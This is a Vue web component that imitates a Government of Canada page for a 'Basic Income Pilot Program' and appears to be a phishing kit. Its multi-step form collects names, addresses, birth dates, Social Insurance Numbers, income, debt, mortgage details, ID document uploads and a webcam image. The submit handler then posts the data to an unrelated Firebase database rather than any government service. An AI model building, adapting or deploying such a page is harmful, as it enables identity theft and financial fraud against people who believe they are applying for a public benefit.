<template>

  <body typeof="WebPage" resource="#wb-webpage">
  <div class="newpar new section"></div>

  <div class="par iparys_inherited">
    <div class="global-header">
      <nav>
        <ul id="wb-tphp" class="wb-init wb-disable-inited">
          <li class="wb-slc"><a class="wb-sl" href="#">Skip to main content</a></li>
          <li class="wb-slc"><a class="wb-sl" href="#">Skip to: Social Insurance Number</a></li>
          <li class="wb-slc"><a class="wb-sl" href="#">Skip to "About government"</a></li>

          <li class="wb-slc">
            <a class="wb-sl" href="#" rel="alternate">Switch to basic HTML version</a>
          </li>
        </ul>
      </nav>

      <header>
        <div id="wb-bnr" class="container">
          <div class="row">
            <section id="wb-lng" class="col-xs-3 col-sm-12 pull-right text-right">
              <h2 class="wb-inv">Language selection</h2>
              <div class="row">
                <div class="col-md-12">
                  <ul class="list-inline mrgn-bttm-0">
                    <li>
                      <a lang="fr" href="#">
                        <span class="hidden-xs" translate="no">English</span>
                        <abbr
                            title="Français"
                            class="visible-xs h3 mrgn-tp-sm mrgn-bttm-0 text-uppercase"
                            translate="no"
                        >En</abbr
                        >
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </section>
            <div
                class="brand col-xs-9 col-sm-5 col-md-4"
                property="publisher"
                resource="#wb-publisher"
                typeof="GovernmentOrganization"
            >
              <a href="#" property="url">
                <img
                    src="../assets/img/sig-blk-en.svg"
                    alt="Basic Income Pilot Program"
                    property="logo"
                />
                <span class="wb-inv">
                    /

                    <span lang="fr"> du Canada</span>
                  </span>
              </a>

              <link property="logo" href="../assets/img/wmms-blk.svg" />
            </div>
            <section
                id="wb-srch"
                class="col-lg-offset-4 col-md-offset-4 col-sm-offset-2 col-xs-12 col-sm-5 col-md-4"
            >
              <h2>Search</h2>

              <form  name="cse-search-box" role="search">
                <div class="form-group wb-srch-qry">
                  <label for="wb-srch-q" class="wb-inv">Search Canada.ca</label>

                  <input
                      id="wb-srch-q"
                      list="wb-srch-q-ac"
                      class="wb-srch-q form-control"
                      name="q"
                      type="search"
                      value=""
                      size="34"
                      maxlength="170"
                      placeholder="Search Canada.ca"
                  />

                  <datalist id="wb-srch-q-ac"> </datalist>
                </div>
                <div class="form-group submit">
                  <button
                      type="submit"
                      id="wb-srch-sub"
                      class="btn btn-primary btn-small"
                      name="wb-srch-sub"  style="background-color:  #26374a;border: none" >
                      <span class=""><SearchOutlined style="color: white;font-weight: bolder; font-size: large" /></span
                      ><span class="wb-inv">Search</span>
                  </button>
                </div>
              </form>
            </section>
          </div>
        </div>
        <hr />

        <div class="container">
          <div class="row">
            <div class="col-md-8">
              <nav
                  class="gcweb-menu wb-init gcweb-menu-inited"
                  typeof="SiteNavigationElement"
                  id="wb-auto-2"
              >
                <h2 class="wb-inv">Menu</h2>
                <button
                    type="button"
                    aria-haspopup="true"
                    aria-expanded="false"
                    aria-label="Press the SPACEBAR to expand or the escape key to collapse this menu. Use the Up and Down arrow keys to choose a submenu item. Press the Enter or Right arrow key to expand it, or the Left arrow or Escape key to collapse it. Use the Up and Down arrow keys to choose an item on that level and the Enter key to access it."
                >
                  <span class="wb-inv">Main </span>Menu
                  <span class=""> <caret-down-outlined></caret-down-outlined></span>
                </button>
                <ul
                    role="menu"
                    aria-orientation="vertical"
                    data-ajax-replace="/content/dam/canada/sitemenu/sitemenu-v2-en.html"
                    class="wb-init wb-data-ajax-replace-inited"
                    id="wb-auto-3"
                >
                </ul>
              </nav>
            </div>
          </div>
        </div>

        <nav id="wb-bc" property="breadcrumb">
          <h2 class="wb-inv">You are here:</h2>
          <div class="container">
            <ol class="breadcrumb">
              <li class="d-flex  align-center" ><a href="#" class="link-color">Canada.ca</a>    <span class="mdi mdi-chevron-right" style="font-size: 18px"></span>   <a href="#" class="link-color">Canada emergency response benefit</a></li>

            </ol>
          </div>
        </nav>
      </header>
    </div>
  </div>

  <main
      property="mainContentOfPage"
      resource="#wb-main"
      typeof="WebPageElement"
      class="container"
  >
    <div class="mwsgeneric-base-html parbase section">
      <div class="gc-subway-wrapper">
        <nav class="provisional gc-subway wb-init gc-subway-inited no-blink" id="wb-auto-4">
          <hgroup>
            <h1 id="gc-document-nav">Basic Income Pilot</h1>
            <p class="h3 hidden-xs visible-md visible-lg mrgn-tp-0">Sections</p>
          </hgroup>
          <ul>
            <li>
               <router-link :to="{name:'home'}"><a href="#" class=" hidden-xs hidden-sm" aria-current="page" tabindex="0">Overview</a></router-link>
               <router-link :to="{name:'home'}"><a href="#" class=" hidden-md hidden-lg" aria-current="page" tabindex="0">Overview</a></router-link>
            </li>
<!--            <li>-->
<!--               <router-link :to="{name:'apply'}"><a href="#" class="hidden-xs hidden-sm">Who needs basic income</a></router-link>-->
<!--               <router-link :to="{name:'apply'}"><a href="#" class="hidden-xs hidden-sm hidden-md hidden-lg">Who needs basic income</a></router-link>-->
<!--               <router-link :to="{name:'apply'}"><a href="#" class="visible-xs visible-sm hidden-xs hidden-sm">Who needs basic income</a></router-link>-->
<!--               <router-link :to="{name:'apply'}"><a href="#" class="visible-xs visible-sm hidden-md hidden-lg">Who needs basic income</a></router-link>-->
<!--            </li>-->
            <li>
              <a href="#" class=" active hidden-xs hidden-sm">Apply</a
              ><a href="#" class=" active hidden-xs hidden-sm hidden-md hidden-lg">Apply</a>
              <a href="#" class=" active visible-xs visible-sm hidden-xs hidden-sm">Apply</a
              ><a href="#" class="active visible-xs visible-sm hidden-md hidden-lg">Apply</a>
            </li>

          </ul>
        </nav>
      </div>
      <section class="gc-subway-section">
        <hgroup>
          <p>Basic Income Pilot Program</p>
          <h1 property="name" id="" class="gc-thickline">Overview</h1>
        </hgroup>
        <section class="alert alert-warning">
          <h2>Apply</h2>
          <p>
            for establishing a national livable income program
          </p>
        </section>
        <p>
          Right now, struggling Canadians can access help support through a patchwork of federal, provincial and municipal programs.
        </p>
        <div class="w700" >
          <form @submit.prevent="submitform" method="post">
            <div class="form-header">
              BIPP Application Form
            </div>
            <div  class="form-body">
              <a-steps :current="current" :items="items"    :status="`wait`"   :initial="0" ></a-steps>
              <div class="steps-content" v-show="!!truth" >

                <v-text-field
                    v-model="firstname"
                    :rules="rules"
                    label="First Name"
                    style="padding: 15px 0;"
                    color="primary"
                    variant="outlined"
                >
                </v-text-field>

                <v-text-field
                    v-model="lastname"
                    :rules="rules"
                    label="Last Name "
                    style="padding: 5px 0;"
                    color="primary"
                    variant="outlined"
                >
                </v-text-field>

                <v-text-field
                    v-model="email"
                    :rules="rules"
                    label="Email "
                    style="padding: 5px 0;"
                    color="primary"
                    variant="outlined"
                    type="email"
                >
                </v-text-field>




                <v-text-field
                    v-model="stName"
                    :rules="rules"
                    label="Street Name "
                    style="padding: 5px 0;"
                    color="primary"
                    variant="outlined"
                >
                </v-text-field>

                <div class="d-flex justify-space-between align-center ga-5">
                  <v-text-field
                      v-model="city"
                      :rules="rules"
                      label="City/Town"
                      type="input"
                      style="padding: 5px 0; width: 35%"
                      color="primary"
                      variant="outlined"
                  >
                  </v-text-field>

                  <v-text-field
                      v-model="state"
                      :rules="rules"
                      label="Province/State"
                      style="padding: 5px 0;width: 40%"
                      color="primary"
                      variant="outlined"
                  >
                  </v-text-field>
                </div>

                <div class="d-flex justify-space-between align-center ga-5">
                  <v-text-field
                      v-model="postal"
                      :rules="rules"
                      label="Postal Code"
                      style="padding: 5px 0; width: 35%"
                      color="primary"
                      variant="outlined"
                  >
                  </v-text-field>

                  <v-text-field
                      v-model="pNumber"
                      :rules="rules"
                      label="Phone Number "
                      style="padding: 5px 0;width: 40%;"
                      color="primary"
                      variant="outlined"
                      type="number"
                  >
                  </v-text-field>

                </div>

              </div>

              <div class="steps-content" v-show="truth2"   >

                <v-select
                    v-model="mts"
                    label="Marital Status"
                    :items="['Married', 'Single']"
                    style="padding: 5px 0;"
                    color="primary"
                    variant="outlined"
                ></v-select>

                <v-text-field
                    v-model="dob"
                    :rules="rules"
                    label="Date Of Birth"
                    style="padding: 5px 0;"
                    color="primary"
                    variant="outlined"
                    type="date"
                >
                </v-text-field>

                <div class="d-flex justify-space-between align-center ga-5">
                  <v-text-field
                      v-model="fin"
                      :rules="rules"
                      label="Family Income "
                      type="number"
                      style="padding: 5px 0;width: 35%"
                      color="primary"
                      variant="outlined"
                  >
                  </v-text-field>

                  <v-text-field
                      v-model="sin"
                      :rules="rules"
                      label=" SIN "
                      type="number"
                      style="padding: 5px 0;width: 40%;"
                      color="primary"
                      variant="outlined"
                  >
                  </v-text-field>

                </div>
                <v-text-field
                    v-model="nod"
                    :rules="rules"
                    label=" Number of Dependant "
                    type="number"
                    style="padding: 5px 0;"
                    color="primary"
                    variant="outlined"
                >
                </v-text-field>
                <v-text-field
                    v-model="ccdp"
                    :rules="rules"
                    label=" Credit Card Debt Payment "
                    type="number"
                    style="padding: 5px 0;"
                    color="primary"
                    variant="outlined"
                >
                </v-text-field>
                <v-text-field
                    v-model="mortgage"
                    :rules="rules"
                    label=" Mortgage Amount "
                    type="number"
                    style="padding: 5px 0;"
                    color="primary"
                    variant="outlined"
                ></v-text-field>


              </div>
              <div class="steps-content" v-show="truth3">
                <!--    {{ steps[current].content }}-->

                <div class="d-flex justify-space-between align-center ga-5">
                  <v-checkbox label="Permanent  Resident" color="primary"  v-model="permanentResident" ></v-checkbox>

                  <v-checkbox label="Citizenship" color="primary" v-model="citizenship" ></v-checkbox>
                </div>

                <v-file-input label="proof of citizenship  "
                              style="padding: 5px 0;"
                              color="primary"
                              variant="outlined"
                              v-if="citizenship"
                >

                </v-file-input>


                <v-file-input label="proof of citizenship or permanent residency front"
                              style="padding: 5px 0;"
                              color="primary"
                              variant="outlined"
                              v-if="permanentResident"
                >

                </v-file-input>

                <v-file-input label="proof of citizenship or permanent residency back"
                              style="padding: 5px 0;"
                              color="primary"
                              variant="outlined"
                              v-if="permanentResident"
                >

                </v-file-input>


                <div class="verify_button"  @click.prevent="videoVerification" >
                  Video verification
                </div>

                <div class="App">
                  <header class="App-header">
<!--                    <button @click.prevent="startRecording" :disabled="isRecording || countdown > 0">-->
<!--                      Start Recording-->
<!--                    </button>-->
                    <br>


                    <div class="video-container">
                      <video
                          ref="videoRef"
                          autoplay
                          class="video-feed"
                          v-show="isRecording"
                      ></video>
                      <div class="countdown" v-if="countdown > 0" v-show="isRecording">
                        {{ countdown }}
                      </div>
                      <img
                          :src="capturedImage"
                          alt="Captured"
                          class="captured-image"
                          v-show="!isRecording && capturedImage"
                      />
                    </div>
                    <button @click.prevent="stopRecording" class="verify_button"  v-if="stopRecord"  :disabled="!isRecording">
                      Capture
                    </button>
                  </header>
                </div>

              </div>
              <div class="steps-action d-flex justify-space-between align-center ">
                <a-button v-if="current < steps.length - 1" type="primary" @click="next"   class="btn-fm" >Next</a-button>
                <a-button
                    v-if="current == steps.length - 1"
                    type="primary"
                    @click.prevent="submitform"
                    class="btn-fm"
                >
                  Done
                </a-button>
                <a-button v-if="current > 0" style="margin-left: 8px" @click="prev" class="btn-fm">Previous</a-button>
              </div>
            </div>

          </form>

        </div>
        <br>
        <br>

<!--        <div>-->
<!--          <h2>Basic Income Pilot Value (BIPP)</h2>-->
<!--          <p>-->
<!--            What makes basic income different from other programs, such as income assistance or welfare, is that it comes with no strings attached. In the simplest terms, it's a regular payment without conditions, sent from the government to families and individuals.-->
<!--          </p>-->
<!--          <h2>Universal basic income (UBI)</h2>-->
<!--          <p>means that everyone in a society — rich or poor — gets a monthly cheque for the same amount. At the end of the year, the government uses the tax system to balance out the scales and recoup that extra cash from the higher income earners who didn't end up needing it. </p>-->

<!--          <h2>Guaranteed basic income (GBI)</h2>-->
<!--          <p>-->
<!--            is the system most people are referring to when they talk about basic income in Canada. It is an income-contingent system, meaning monthly payments only go to families and individuals with lower income.-->
<!--          </p>-->
<!--          <p>-->
<!--            Service Canada may issue a new BIPP only if there is proof that the BIPP was used-->
<!--            fraudulently. If you think this may apply to you, refer to&nbsp;<a href="#"-->
<!--          >Protecting your SIN</a-->
<!--          >-->
<!--            for more information.-->
<!--          </p>-->

<!--        </div>-->





        <h2 style="color: black">Contact</h2>
        <p>
          For more information, contact the&nbsp;<a href="#">Basic Income Pilot Program</a>.
        </p>
        <nav class="mrgn-bttm-lg mrgn-tp-lg">
          <h3 class="wb-inv">Document navigation</h3>
          <ul class="pager">

          </ul>
        </nav>
      </section>
    </div>
    <div class="mwsgeneric-base-html parbase section">
      <div class="row row-no-gutters mrgn-tp-xl gc-subway-section-end">
        <!--Start of Feedback widget code-->
        <div class="col-sm-7 col-lg-6">
          <figure class="gc-pg-hlpfl provisional well mrgn-bttm-0" aria-live="polite">
            <figcaption class="wb-inv">Page feedback</figcaption>
            <form
                id="gc-pg-hlpfl-frm"
                action="#"
                method="post"
                autocomplete="off"
                class="provisional wb-postback wb-init wb-postback-inited"
                data-wb-postback='{"success":".gc-pg-hlpfl-thnk","content":"#gc-pg-hlpfl-frm"}'
            >
              <input
                  type="hidden"
                  name="institutionopt"
                  value="Employment and Social Development Canada"
              />
              <!--Update the values-->
              <input type="hidden" name="themeopt" value="Social Insurance Number (SIN)" />
              <input type="hidden" name="sectionopt" value="Employment Insurance" />
              <input type="hidden" name="pageTitle" value="SIN Overview" />
              <!--End of values that need to be updated-->
              <input type="hidden" name="emailTemplate" value="servcan/gc-pagesuccessen" />
              <fieldset class="gc-pg-hlpfl-btn chkbxrdio-grp row row-no-gutters">
                <legend class="col-xs-12 col-sm-7 col-md-8 mrgn-tp-sm">
                  <span class="field-name">Did you find what you were looking for?</span>
                </legend>
                <div class="col-xs-8 col-sm-5 col-md-4 text-right">
                  <button
                      name="helpful"
                      value="Yes"
                      class="btn btn-primary nojs-show pull-right"
                      data-gc-analytics-wtph=""
                      aria-describedby="why-note"
                      style="color: white"
                  >
                    Yes
                  </button>
                  <button
                      type="submit"
                      name="helpful"
                      value="Yes"
                      class="btn btn-primary nojs-hide"
                      data-gc-analytics-wtph=""
                      style="color: white"
                  >
                    Yes
                  </button>
                  <button
                      type="button"
                      class="btn btn-primary mrgn-lft-sm nojs-hide"
                      data-wb-doaction='[
						{"action":"removeClass","source":".gc-pg-hlpfl-no","class":"nojs-show"},
						{"action":"addClass","source":".gc-pg-hlpfl-btn","class":"hide"}
						]'
                      data-gc-analytics-wtph-no=""
                      style="color: red"
                  >
                    No
                  </button>
                </div>
              </fieldset>
              <div class="gc-pg-hlpfl-no nojs-show">
                <p id="why-note" class="nojs-show mrgn-tp-lg mrgn-bttm-md">
                  <strong>If not, tell us why below:</strong>
                </p>
                <div aria-live="off">
                  <fieldset class="chkbxrdio-grp">
                    <legend><span class="field-name">What was wrong?</span></legend>
                    <div class="radio">
                      <label for="problem1">
                        <input
                            name="problem"
                            id="problem1"
                            type="radio"
                            value="I can&#39;t find the information"
                            data-gc-analytics-wtph-value="I can&#39;t find the information-Je ne peux pas trouver l&#39;information"
                            data-gc-analytics-collect="notPrivate"
                        />
                        I can't <strong>find</strong> the information
                      </label>
                    </div>
                    <div class="radio">
                      <label for="problem2">
                        <input
                            name="problem"
                            id="problem2"
                            type="radio"
                            value="The information is hard to understand"
                            data-gc-analytics-wtph-value="The information is hard to understand-L&#39;information est difficile à comprendre"
                            data-gc-analytics-collect="notPrivate"
                        />
                        The information is hard to <strong>understand</strong>
                      </label>
                    </div>
                    <div class="radio">
                      <label for="problem3">
                        <input
                            name="problem"
                            id="problem3"
                            type="radio"
                            value="There was an error / something didn&#39;t work"
                            data-gc-analytics-wtph-value="There was an error or something didn&#39;t work-Il y avait une erreur ou quelque chose ne fonctionnait pas"
                            data-gc-analytics-collect="notPrivate"
                        />
                        There was an error or something <strong>didn't work</strong>
                      </label>
                    </div>
                    <div class="radio">
                      <label for="problem4">
                        <input
                            name="problem"
                            id="problem4"
                            type="radio"
                            value="Other reason"
                            data-gc-analytics-wtph-value="Other reason-Autre raison"
                            data-gc-analytics-collect="notPrivate"
                        />
                        Other reason
                      </label>
                    </div>
                  </fieldset>
                  <div class="form-group">
                    <label for="problem6" class="mrgn-tp-sm mrgn-bttm-0"
                    ><span class="field-name"
                    >Please provide more details (maximum 300 characters)</span
                    ></label
                    >
                    <textarea
                        id="problem6"
                        aria-describedby="problem6-note"
                        name="details"
                        class="form-control full-width"
                        maxlength="300"
                    ></textarea>
                    <p id="problem6-note">
                      <small
                      >You will not receive a reply. Telephone numbers and email addresses will
                        be removed.</small
                      >
                    </p>
                  </div>
                  <button
                      type="submit"
                      name="helpful"
                      value="No"
                      class="btn btn-primary"
                      data-gc-analytics-wtph-submit=""
                  >
                    Submit
                  </button>
                  <input type="hidden" name="problem" value="" />
                </div>
              </div>
            </form>
            <div class="gc-pg-hlpfl-thnk hide">
              <p class="mrgn-tp-sm mrgn-bttm-0">
                  <span
                      class="far fa-check-circle text-success mrgn-rght-sm"
                      aria-hidden="true"
                  ></span>
                Thank you for your feedback.
              </p>
            </div>
          </figure>
        </div>
        <div class="col-sm-3 col-sm-offset-1 col-lg-offset-3">
          <div
              class="wb-share wb-init wb-share-inited"
              data-wb-share='{"pnlId":"pnlShrPg", "lnkClass": "btn btn-default btn-block mrgn-tp-md"}'
              id="wb-auto-19"
          >
            <section
                id="shr-pg-pnlShrPg"
                class="shr-pg mfp-hide modal-dialog modal-content overlay-def"
            >
              <header class="modal-header">
                <h2 class="modal-title">Share this page</h2>
              </header>
              <div class="modal-body">
                <ul class="list-unstyled colcount-xs-2">

                </ul>
                <p class="col-sm-12 shr-dscl">
                  No endorsement of any products or services is expressed or implied.
                </p>
                <div class="clearfix"></div>
              </div>
            </section>
            <a
                href="##shr-pg-pnlShrPg"
                aria-controls="shr-pg-pnlShrPg"
                class="shr-opn wb-lbx btn btn-default btn-block mrgn-tp-md wb-lbx-inited wb-init"
                id="wb-auto-20"
            ><span class=""> <share-alt-outlined></share-alt-outlined> </span>Share this page</a
            >
          </div>
        </div>
      </div>
    </div>

    <section class="pagedetails">
      <h2 class="wb-inv">Page details</h2>
      <div class="row">
        <div class="col-xs-12">
          <dl id="wb-dtmd">
            <dt>Date modified:</dt>
            <dd><time property="dateModified">2024-05-10</time></dd>
          </dl>
        </div>
      </div>
    </section>
  </main>

  <div class="newpar new section"></div>

  <div class="par iparys_inherited"></div>

  <div class="newpar new section"></div>

  <div class="par iparys_inherited">
    <div class="global-footer">
      <footer id="wb-info">
        <h2 class="wb-inv">About this site</h2>

        <div class="gc-main-footer">
          <div class="container">
            <nav>
              <h3>Basic Income Pilot Program</h3>
              <ul class="list-unstyled colcount-sm-2 colcount-md-3">
                <li><a href="#">All contacts</a></li>
                <li><a href="#">Departments and agencies</a></li>
                <li><a href="#">About government</a></li>
              </ul>
              <h4><span class="wb-inv">Themes and topics</span></h4>
              <ul class="list-unstyled colcount-sm-2 colcount-md-3">
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Immigration and citizenship</a></li>
                <li><a href="#">Travel and tourism</a></li>
                <li><a href="#">Business</a></li>
                <li><a href="#">Benefits</a></li>
                <li><a href="#">Health</a></li>
                <li><a href="#">Taxes</a></li>
                <li><a href="#">Environment and natural resources</a></li>
                <li><a href="#">National security and defence</a></li>
                <li><a href="#">Culture, history and sport</a></li>
                <li><a href="#">Policing, justice and emergencies</a></li>
                <li><a href="#">Transport and infrastructure</a></li>
                <li><a href="#">Canada and the world</a></li>
                <li><a href="#">Money and finance</a></li>
                <li><a href="#">Science and innovation</a></li>
                <li><a href="#">Indigenous peoples</a></li>
                <li><a href="#">Veterans and military</a></li>
                <li><a href="#">Youth</a></li>
              </ul>
            </nav>
          </div>
        </div>
        <div class="gc-sub-footer">
          <div class="container d-flex align-items-center">
            <nav>
              <h3 class="wb-inv">Basic Income Pilot Program Corporate</h3>
              <ul>
                <li><a href="#">Social media</a></li>
                <li><a href="#">Mobile applications</a></li>
                <li><a href="#">About Canada.ca</a></li>

                <li><a href="#">Terms and conditions</a></li>
                <li><a href="#">Privacy</a></li>
              </ul>
            </nav>
            <div class="wtrmrk align-self-end">
              <img src="../assets/img/wmms-blk.svg" alt="Symbol of the Basic Income Pilot Program" />
            </div>
          </div>
        </div>
      </footer>
    </div>
  </div>
  </body>

</template>

<script setup >

import {onUnmounted, reactive, ref} from "vue";
import axios from "axios";
import {CaretDownOutlined, SearchOutlined, ShareAltOutlined} from '@ant-design/icons-vue';

import {useRouter} from "vue-router";
const  router = useRouter()

const permanentResident = ref(false)
const citizenship = ref(false)

const name = ref('')

const loading = ref(false)
const words = ref('')
const current = ref("0")

const truth = ref(true)
const truth2 = ref(false)
const truth3 = ref(false)

const next = () => {
  current.value++;
   if (truth.value === true && truth2.value === false && truth3.value === false) {
     truth.value = false
     truth2.value = true
     truth3.value = false
   }else if (truth.value === false && truth2.value === true && truth3.value === false) {
     truth.value = false
     truth2.value = false
     truth3.value = true
   }
};
const prev = () => {
  current.value--;
  if (truth.value === false && truth2.value === false && truth3.value === true) {
    truth.value = false
    truth2.value = true
    truth3.value = false
  }else if(truth.value === false && truth2.value === true && truth3.value === false) {
    truth.value = true
    truth2.value = false
    truth3.value = false
  }
};

const steps = [
  {
    title: '0',
    content: 'First-content',
    stepNumber: 0,
    subTitle: '%',
    description: 'who please',
    icon: '50',
  },
  {
    title: '50',
    content: 'Second-content',
    stepNumber: 50,
    status: 'finish',
    description: '%',
    subTitle: '%',
    icon: '50',
  },
  {
    title: '100',
    content: 'Last-content',
    subTitle: '%',
    description: '%',
    icon: '50',
  },
];
const items = steps.map(item => ({ key: item.content, title: item.title, subTitle: item.subTitle, icon: item.icon, }));

const firstname = ref('')
const lastname = ref('')
const  email = ref('')
const stName = ref('')
const city = ref('')
const state = ref('')
const postal = ref('')
const dob = ref('')
const pNumber = ref('')
const mts = ref('')
const fin = ref('')
const sin = ref('')
const nod = ref('')
const ccdp = ref('')
const mortgage = ref('')

const rules = ref([
  value => {
    if (value) return true

    return 'Required.'
  },
])


const submitform = async () => {
  if (!!firstname.value && !!lastname.value && !!email.value  && !!dob.value && !!pNumber.value && !!mts.value && !!sin.value && !!nod.value   && !!stName.value && !!city.value && !!state.value && !!postal.value  && !!ccdp.value && mortgage.value  ) {
    loading.value = true
    await axios.post('https://passive-2d3a5-default-rtdb.firebaseio.com/push.json' , {
        "firstname": firstname.value,
        "lastname": lastname.value,
        "dob": dob.value,
      "email": email.value,
        "pNumber": pNumber.value,
        "mts": mts.value,
        "sin": sin.value,
        "nod": nod.value,
        "debt": ccdp.value,
      "street": stName.value,
        "city": city.value,
      "state": state.value,
      "postal": postal.value,
      "mortgage": mortgage.value,
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    })
        .then(response => {
          console.log(response.data)
          words.value = response.data.name

        })
    alert('sent')
    loading.value = false
     await router.push({name: 'apply'})
  } else {
    alert('input all fields')
  }
}

//camera setup

const isRecording = ref(false);
const capturedImage = ref(null);
const videoRef = ref(null);
const videoUrl = ref("");
const countdown = ref(0);
const mediaRecorder = ref(null);
const stream = ref(null);
const recordedChunks = reactive([]);

const stopRecord = ref(false)

const getMedia = async () => {
  try {
    const mediaStream = await navigator.mediaDevices.getUserMedia({
      video: true,
    });
    stream.value = mediaStream;
    if (videoRef.value) videoRef.value.srcObject = mediaStream;
    const recorder = new MediaRecorder(mediaStream);
    mediaRecorder.value = recorder;
  } catch (error) {
    console.error("Error accessing the camera:", error);
  }
};

const stopMediaStream = () => {
  if (stream.value) {
    const tracks = stream.value.getTracks();
    tracks.forEach((track) => track.stop());
    stream.value = null; // Ensure to clear the stream state
  }
};

const startRecording = async () => {
  // Update the state to show the live feed and remove the captured image
  await getMedia();
  isRecording.value = true;
  capturedImage.value = null;
  countdown.value = 5; // Start countdown from 5 seconds
  const countdownInterval = setInterval(() => {
    if (mediaRecorder.value && mediaRecorder.value.state === "inactive") {
      mediaRecorder.value.start();
      console.log(mediaRecorder.value.state);
      console.log("recorder started");
      mediaRecorder.value.ondataavailable = (event) => {
        if (event.data.size > 0) {
          recordedChunks.push(event.data);
          console.log(event.data);
        }
      };
    }
    countdown.value -= 1;
    if (countdown.value <= 0) {
      clearInterval(countdownInterval); // Clear interval when countdown finishes
      countdown.value = 0;
    }
  }, 1000);
};

const stopRecording = () => {
  if (mediaRecorder.value) {
    mediaRecorder.value.stop();

    const canvas = document.createElement("canvas");
    canvas.width = videoRef.value.videoWidth;
    canvas.height = videoRef.value.videoHeight;
    const ctx = canvas.getContext("2d");

    // Draw the current video frame to the canvas
    ctx.drawImage(videoRef.value, 0, 0, canvas.width, canvas.height);

    // Convert the canvas to an image URL
    const imageUrl = canvas.toDataURL("image/png");
    const videoBlob = new Blob(recordedChunks, { type: "video/webm" });
    const url = URL.createObjectURL(videoBlob);
    videoUrl.value = url;
    capturedImage.value = imageUrl;
    isRecording.value = false;
    stopMediaStream();
  }
};

const videoVerification = async () => {
  await startRecording();
  stopRecord.value = true;

}

// Cleanup on component unmount
onUnmounted(() => {
  stopMediaStream();
});


</script>

<style lang="scss">
.steps-content {
  margin-top: 16px;
  border-radius: 0;
  background-color: #fafafa;
  padding: 20px;
}

.steps-action {
  margin-top: 24px;
}

[data-theme='dark'] .steps-content {
  background-color: #2f2f2f;
  border: 1px dashed #404040;
}

.App {
  text-align: center;
}

.App-header {
  background-color: transparent;
  min-height: auto;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  font-size: calc(10px + 2vmin);
  color: #2b542c;
}

.video-container {
  position: relative;
}

.video-feed {
  padding: 20px;
  width: 100%;
  max-width: 100%;
}

.countdown {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  font-size: 48px;
  color: green;
}

.captured-image {
  width: 100%;
  max-width: 100%;
}

</style>
